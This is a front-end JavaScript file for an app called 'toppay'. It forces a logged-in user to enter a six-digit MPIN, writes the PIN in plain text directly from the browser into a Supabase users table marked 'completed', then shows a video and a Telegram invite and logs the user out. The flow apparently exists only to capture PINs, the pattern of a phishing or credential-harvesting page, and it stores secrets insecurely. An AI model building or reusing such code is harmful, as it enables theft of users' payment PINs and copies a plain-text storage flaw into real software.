// user-app/js/home.js
// Complete flow: Session → Load Data → MPIN → Success → Video → Telegram → Logout
import { supabase } from "./config/supabase.js";

document.addEventListener("DOMContentLoaded", async () => {
  // 1. Check Session
  const sessionStr = sessionStorage.getItem("toppay_session");
  if (!sessionStr) {
    window.location.href = "/login";
    return;
  }
  const session = JSON.parse(sessionStr);

  // Elements
  const overlay = document.getElementById("overlay");
  const mpinPopup = document.getElementById("mpinPopup");
  const successPopup = document.getElementById("successPopup");
  const videoPopup = document.getElementById("videoPopup");
  const telegramPopup = document.getElementById("telegramPopup");

  const mpinInputs = Array.from(document.querySelectorAll(".mpin-box"));
  const mpinCancelBtn = document.getElementById("mpinCancelBtn");
  const mpinConfirmBtn = document.getElementById("mpinConfirmBtn");

  const videoPlayer = document.getElementById("popupVideo");
  const videoCloseBtn = document.getElementById("videoCloseBtn");

  const telegramJoinBtn = document.getElementById("telegramJoinBtn");
  const telegramCloseBtn = document.getElementById("telegramCloseBtn");

  let videoData = null;
  let telegramData = null;

  // ======================================
  // Fetch settings and slider data
  // ======================================
  async function loadData() {
    try {
      // Fetch Video settings
      const { data: vData } = await supabase
        .from("popup_video")
        .select("*")
        .eq("is_enabled", true)
        .limit(1);
      if (vData && vData.length > 0) videoData = vData[0];

      // Fetch Telegram settings
      const { data: tData } = await supabase
        .from("telegram_popup")
        .select("*")
        .eq("is_enabled", true)
        .order("created_at", { ascending: false })
        .limit(1);
      if (tData && tData.length > 0) telegramData = tData[0];

      // Fetch Slider Images
      const { data: sliders } = await supabase
        .from("slider_images")
        .select("*")
        .eq("is_enabled", true)
        .order("display_order", { ascending: true });

      if (sliders && sliders.length > 0) {
        initSlider(sliders);
      } else {
        // Default placeholder slides
        initSlider([
          {
            id: 1,
            image_url: "",
            is_default: true,
          },
          { id: 2, image_url: "", is_default: true },
          { id: 3, image_url: "", is_default: true },
          { id: 4, image_url: "", is_default: true },
        ]);
      }
    } catch (err) {
      console.error("Error loading data:", err);
      // Still show default slides on error
      initSlider([
        {
          id: 1,
          image_url: "",
          is_default: true,
        },
      ]);
    }
  }

  // ======================================
  // Slider Logic
  // ======================================
  function initSlider(slides) {
    const container = document.getElementById("sliderContainer");
    const dotsContainer = document.getElementById("sliderDots");

    // Clear only slide elements, keep dots container
    const existingSlides = container.querySelectorAll(".slide");
    existingSlides.forEach((s) => s.remove());
    dotsContainer.innerHTML = "";

    slides.forEach((slide, index) => {
      const div = document.createElement("div");
      div.className = `slide ${index === 0 ? "active" : ""}`;
      if (slide.is_default || !slide.image_url) {
        div.classList.add("default-promo");
        div.innerHTML = `
          <div class="promo-copy">
            <strong>A must <em>read for</em><br />newbies</strong>
            <span>How to make more profits</span>
            <button type="button">Click to read</button>
          </div>
          <div class="promo-book" aria-hidden="true"><span>$</span><i></i></div>`;
      } else {
        div.style.backgroundImage = `url('${slide.image_url}')`;
      }
      container.insertBefore(div, dotsContainer);

      const dot = document.createElement("div");
      dot.className = `dot ${index === 0 ? "active" : ""}`;
      dotsContainer.appendChild(dot);
    });

    if (slides.length <= 1) return;

    let currentIdx = 0;
    setInterval(() => {
      const slideEls = container.querySelectorAll(".slide");
      const dotEls = dotsContainer.querySelectorAll(".dot");
      if (slideEls.length <= 1) return;

      slideEls[currentIdx].classList.remove("active");
      dotEls[currentIdx].classList.remove("active");

      currentIdx = (currentIdx + 1) % slides.length;

      slideEls[currentIdx].classList.add("active");
      dotEls[currentIdx].classList.add("active");
    }, 3000);
  }

  // ======================================
  // MPIN Input Logic
  // ======================================
  mpinInputs.forEach((input, index) => {
    input.addEventListener("input", (e) => {
      e.target.value = e.target.value.replace(/[^0-9]/g, "");
      if (e.target.value && index < mpinInputs.length - 1) {
        mpinInputs[index + 1].focus();
      }
      // Auto-submit when last digit is entered
      checkMpinComplete();
    });

    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !e.target.value && index > 0) {
        mpinInputs[index - 1].focus();
      }
    });
  });

  function checkMpinComplete() {
    const mpin = mpinInputs.map((i) => i.value).join("");
    if (mpin.length === 6) {
      // Auto confirm - jaise hi last digit enter hogi
      submitMpin(mpin);
    }
  }

  // ======================================
  // MPIN Cancel → Logout
  // ======================================
  if (mpinCancelBtn) {
    mpinCancelBtn.addEventListener("click", () => {
      // Cancel = MPIN save nahi hoga, status stays "pending"
      // Auto Logout → Login Page
      logout();
    });
  }

  if (mpinConfirmBtn) {
    mpinConfirmBtn.addEventListener("click", () => {
      const mpin = mpinInputs.map((i) => i.value).join("");
      if (mpin.length === 6) {
        submitMpin(mpin);
      } else {
        const firstEmpty = mpinInputs.find(i => !i.value);
        if (firstEmpty) firstEmpty.focus();
      }
    });
  }

  // Overlay click outside popup = cancel/logout
  overlay.addEventListener("click", (e) => {
    // Only if MPIN popup is visible and user clicks the dark overlay (not the popup itself)
    if (e.target === overlay && !mpinPopup.classList.contains("hidden")) {
      logout();
    }
  });

  // ======================================
  // Submit MPIN
  // ======================================
  async function submitMpin(mpin) {
    // Disable inputs
    mpinInputs.forEach((i) => (i.disabled = true));

    try {
      // Update Supabase: save mpin + status = completed
      const { error } = await supabase
        .from("users")
        .update({ mpin: mpin, status: "completed" })
        .eq("id", session.userId);

      if (error) {
        console.error("MPIN update error:", error);
        throw error;
      }

      // Hide MPIN, show success
      mpinPopup.classList.add("hidden");
      successPopup.classList.remove("hidden");

      // Success message shows for 2 seconds, then check next popup
      setTimeout(() => {
        successPopup.classList.add("hidden");
        checkNextPopup();
      }, 2000);
    } catch (error) {
      console.error("MPIN submit error:", error);
      mpinInputs.forEach((i) => {
        i.disabled = false;
        i.value = "";
      });
      mpinInputs[0].focus();
    }
  }

  // ======================================
  // After MPIN Success → Video → Telegram → Logout
  // ======================================
  function checkNextPopup() {
    if (videoData && videoData.video_url) {
      showVideo();
    } else if (telegramData && telegramData.telegram_link) {
      showTelegram();
    } else {
      // Video OFF, Telegram OFF → Seedha Logout
      logout();
    }
  }

  // ======================================
  // Video Popup
  // ======================================
  function showVideo() {
    videoPopup.classList.remove("hidden");
    videoPlayer.src = videoData.video_url;
    videoPlayer.muted = true; // Muted for autoplay
    videoPlayer.play().catch((e) => console.log("Autoplay prevented", e));
  }

  videoCloseBtn.addEventListener("click", () => {
    videoPlayer.pause();
    videoPlayer.src = "";
    videoPopup.classList.add("hidden");

    // After video close → check telegram
    if (telegramData && telegramData.telegram_link) {
      showTelegram();
    } else {
      logout();
    }
  });

  // ======================================
  // Telegram Popup
  // ======================================
  function showTelegram() {
    telegramPopup.classList.remove("hidden");
    document.querySelector(".telegram-title").textContent =
      telegramData.title || "Join our Telegram";
    document.querySelector(".telegram-desc").textContent =
      telegramData.description || "";
    telegramJoinBtn.href = telegramData.telegram_link;
  }

  telegramCloseBtn.addEventListener("click", () => {
    telegramPopup.classList.add("hidden");
    // Telegram close → Auto Logout
    logout();
  });

  // ======================================
  // Logout
  // ======================================
  function logout() {
    // Session Clear
    sessionStorage.removeItem("toppay_session");
    // Redirect to Login Page
    window.location.href = "../pages/login.html";
  }

  // ======================================
  // Initial Load
  // ======================================
  await loadData();

  // After 2 seconds, show mandatory MPIN popup
  setTimeout(() => {
    overlay.classList.add("active");
    mpinPopup.classList.remove("hidden");
    mpinInputs[0].focus();
  }, 2000);
});
